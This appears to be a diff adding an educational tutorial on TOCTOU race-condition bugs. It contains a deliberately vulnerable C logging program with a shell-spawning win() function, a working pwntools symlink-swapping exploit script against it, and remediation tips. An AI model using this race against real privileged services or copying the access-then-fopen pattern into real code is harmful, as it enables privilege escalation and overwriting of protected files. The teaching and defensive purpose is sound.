@@ -1,1 +1,157 @@
+A Race Condition or TOCTOU (Time-of-Check to Time-of-Use) vulnerability occurs when an application checks the status of a resource (like a file or security state) but creates a temporary delay before actually using that resource.
+During this microscopic window of time (the "race window"), an attacker quickly alters the underlying resource. When the program finally acts, it operates on the mutated resource, leading to privilege escalation or arbitrary file access.
+
+1. Visualizing the TOCTOU Gap
+
+text
+Thread 1 (Vulnerable Application)             Thread 2 (Attacker)
+---------------------------------             -------------------
+1. Check: Is "/tmp/target" safe? 
+   (Yes, it's a normal file)
+           |
+           +======= THE RACE WINDOW ========> 2. Quick Swap:
+           |                                  Delete "/tmp/target"
+           v                                  Create Symlink pointing to "/etc/passwd"
+3. Use: Open and write to "/tmp/target"
+   (Tricked into overwriting /etc/passwd!)
+Use code with caution.
+
+2. The Vulnerable C Program (toctou_server.c)
+
+This program runs with high privileges (or simulates a root service daemon). It allows users to log data to a temporary file, performing a safety validation check via access() before executing fopen().
+c
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+
+void win() {
+    printf("[+] Privilege state achieved! Opening administrative shell...\n");
+    system("/bin/sh");
+}
+
+int main() {
+    setbuf(stdout, NULL);
+    char *filepath = "/tmp/user_report.txt";
+    char buffer[256];
+
+    printf("[*] Enterprise Logging Node Active.\n");
+    printf("Enter log message payload: ");
+    if (fgets(buffer, sizeof(buffer), stdin) == NULL) return 0;
+
+    // 1. TIME-OF-CHECK: access() checks the real user ID permissions.
+    // It verifies if the unprivileged user is legally allowed to write to /tmp/user_report.txt
+    if (access(filepath, W_OK) == 0) {
+        
+        // <--- CRITICAL RACE WINDOW --->
+        // The CPU pauses this process to handle other tasks or network traffic.
+        usleep(500); // Intentionally widened sleep to clearly demonstrate the bug
+
+        // 2. TIME-OF-USE: fopen() opens the file.
+        // VULNERABILITY: It assumes the file path still points to the exact same file!
+        FILE *f = fopen(filepath, "a");
+        if (f == NULL) return -1;
+        
+        fprintf(f, "%s", buffer);
+        fclose(f);
+        printf("[+] Log written successfully.\n");
+    } else {
+        printf("[-] Access Denied: Unauthorized file location.\n");
+    }
+
+    // Checking if our exploit successfully linked into a configuration trigger
+    if (access("/tmp/trigger_root", F_OK) == 0) {
+        win();
+    }
+
+    return 0;
+}
+Use code with caution.
+
+3. The Exploit Strategy: Symlink Swapping
+
+To win this race, our exploit code must execute concurrently alongside the vulnerable server.
+1. Ensure /tmp/user_report.txt is created as a normal, harmless file so the server's access() check passes.
+2. The instant access() finishes, delete /tmp/user_report.txt and replace it with a Symbolic Link (symlink) pointing to a file the user shouldn't be allowed to touch (like a root configuration script or /tmp/trigger_root).
+3. When fopen() executes, it follows the symlink and creates/overwrites the target file instead.
+
+4. The Python Exploit Script (race_exploit.py)
+
+Using pwntools and Python's native threading modules, we can spawn a background thread to rapidly swap the file link back and forth while the main thread continuously hammers the vulnerable binary.
+python
+#!/usr/bin/env python3
+from pwn import *
+import threading
+import os
+import time
+
+TARGET_FILE = "/tmp/user_report.txt"
+TRIGGER_FILE = "/tmp/trigger_root"
+
+def file_swapper(stop_event):
+    """Background thread that constantly deletes and swaps the file state"""
+    log.info("Starting rapid file-swapper race loop...")
+    while not stop_event.is_set():
+        # State A: Create a normal file to pass the access() check
+        with open(TARGET_FILE, "w") as f:
+            f.write("safe")
+        
+        # Microscopic pause to let access() read State A
+        time.sleep(0.0001)
+        
+        # State B: Delete and swap to a symlink right inside the race window
+        try:
+            os.remove(TARGET_FILE)
+            os.symlink(TRIGGER_FILE, TARGET_FILE)
+        except FileNotFoundError:
+            pass
+            
+        time.sleep(0.0001)
+        
+        # Clean up symlink for the next execution attempt
+        try:
+            os.remove(TARGET_FILE)
+        except FileNotFoundError:
+            pass
+
+# Main Exploit Loop
+stop_signal = threading.Event()
+swapper_thread = threading.Thread(target=file_swapper, args=(stop_signal,))
+swapper_thread.daemon = True
+swapper_thread.start()
+
+# Give the swapper thread a moment to initialize
+time.sleep(0.5)
+
+# Attempt to win the race multiple times
+for attempt in range(1, 50):
+    io = process('./toctou_server')
+    io.recvuntil(b"Enter log message payload: ")
+    
+    # Send data to write into the target file
+    io.sendline(b"Exploit successful!")
+    
+    output = io.recvall().decode()
+    
+    if "Privilege state achieved" in output:
+        log.success(f"[+] WON THE RACE on attempt #{attempt}!")
+        print(output)
+        break
+    else:
+        io.close()
+
+# Shutdown background thread safely
+stop_signal.set()
+swapper_thread.join()
+
+# Clean up artifact files
+for f in [TARGET_FILE, TRIGGER_FILE]:
+    if os.path.exists(f): os.remove(f)
+Use code with caution.
+
+5. Architectural Defensive Remediations
+
+To permanently immunize file manipulation paths against TOCTOU race conditions:
+• Eliminate Path-Based Operations: Never perform distinct operations using file paths sequentially (e.g., access(path) followed by open(path)). Use File Descriptors instead. By calling open() first, you receive an isolated descriptor handle that binds exclusively to that specific asset inode on the disk, making subsequent manipulations completely immune to path swapping.
+• Use Safe Atomic Primitives: Instead of standard path lookups, leverage newer POSIX atomic variants like openat() combined with the O_NOFOLLOW flag to ensure the process will immediately crash rather than following an unauthorized symlink if an attacker attempts to substitute the endpoint mid-execution.
 
